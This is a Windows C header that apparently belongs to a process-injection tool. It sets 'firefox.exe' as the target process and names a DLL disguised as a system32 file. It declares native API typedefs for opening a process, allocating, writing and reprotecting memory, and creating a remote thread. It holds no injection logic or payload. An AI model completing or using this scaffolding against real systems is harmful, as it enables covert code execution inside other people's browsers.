#include <windows.h>
#define DEBUG(x, ...) printf(x, ##__VA_ARGS__)

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

#define EXPORTEDFUNCTION "DllCanUnloadNow"
#define DLLPATH L"C:\\windows\\system32\\winmde.dll"
#define DLLNAME "winmde.dll"
#define INJECTEDPROCESS "firefox.exe"

/************************************************************************************/
/*                                                                                  */
/*                               TYPE DEFINITIONS                                   */
/*                                                                                  */
/************************************************************************************/

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _STRING {
    USHORT Length;
    USHORT MaximumLength;
    PCHAR Buffer;
} STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef BOOL(NTAPI* pCloseHandle)(HANDLE hObject);
typedef DWORD(NTAPI* pGetLastError)(HANDLE hObject);

typedef BOOL(NTAPI* plstrlenW)(
    LPCWSTR lpString
);

typedef BOOL(NTAPI* pReadFile)(
    IN                HANDLE       hFile,
    OUT               LPVOID       lpBuffer,
    IN                DWORD        nNumberOfBytesToRead,
    OUT               LPDWORD      lpNumberOfBytesRead,
    OUT               LPOVERLAPPED lpOverlapped
);


typedef ULONG(NTAPI* pRtlNtStatusToDosError)(
    NTSTATUS status
);

typedef NTSTATUS(NTAPI* pNtFreeVirtualMemory)(
    IN HANDLE               ProcessHandle,
    IN PVOID*               BaseAddress,
    IN OUT PULONG           RegionSize,
    IN ULONG                FreeType
);

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    OUT PHANDLE hThread,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN PVOID lpStartAddress,
    IN PVOID lpParameter,
    IN ULONG Flags,
    IN SIZE_T StackZeroBits,
    IN SIZE_T SizeOfStackCommit,
    IN SIZE_T SizeOfStackReserve,
    OUT PVOID lpBytesBuffer
);

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    IN HANDLE               ProcessHandle,
    IN OUT PVOID*           BaseAddress,
    IN ULONG                ZeroBits,
    IN OUT PULONG           RegionSize,
    IN ULONG                AllocationType,
    IN ULONG                Protect
);

typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
    IN HANDLE               ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN OUT PULONG           NumberOfBytesToProtect,
    IN ULONG                NewAccessProtection,
    OUT PULONG              OldAccessProtection
);

typedef NTSTATUS(NTAPI* pNtReadVirtualMemory)(
    IN HANDLE               ProcessHandle,
    IN PVOID                BaseAddress,
    OUT PVOID               Buffer,
    IN ULONG                NumberOfBytesToRead,
    OUT PULONG              NumberOfBytesReaded OPTIONAL
);

typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
    IN HANDLE               ProcessHandle,
    IN PVOID                BaseAddress,
    IN PVOID                Buffer,
    IN ULONG                NumberOfBytesToWrite,
    OUT PULONG              NumberOfBytesWritten OPTIONAL
);

typedef NTSTATUS(NTAPI* pNtOpenProcess)(
	OUT PHANDLE             ProcessHandle,
	IN ACCESS_MASK          AccessMask,
	IN POBJECT_ATTRIBUTES   ObjectAttributes,
	IN PCLIENT_ID           ClientId
);

typedef struct _ntdll {
	HMODULE ntdll;
    HMODULE k32;
	struct {
		pNtOpenProcess NtOpenProcess;
		pNtWriteVirtualMemory NtWriteVirtualMemory;
		pNtReadVirtualMemory NtReadVirtualMemory;
		pNtProtectVirtualMemory NtProtectVirtualMemory;
        pNtAllocateVirtualMemory NtAllocateVirtualMemory;
        pNtCreateThreadEx NtCreateThreadEx;
        pNtFreeVirtualMemory NtFreeVirtualMemory;
        pRtlNtStatusToDosError RtlNtStatusToDosError;

        pReadFile ReadFile;
        plstrlenW lstrlenW;
        pCloseHandle CloseHandle;
        pGetLastError GetLastError;
	} api;
	
} NTDLLAPI;

NTDLLAPI ntdll;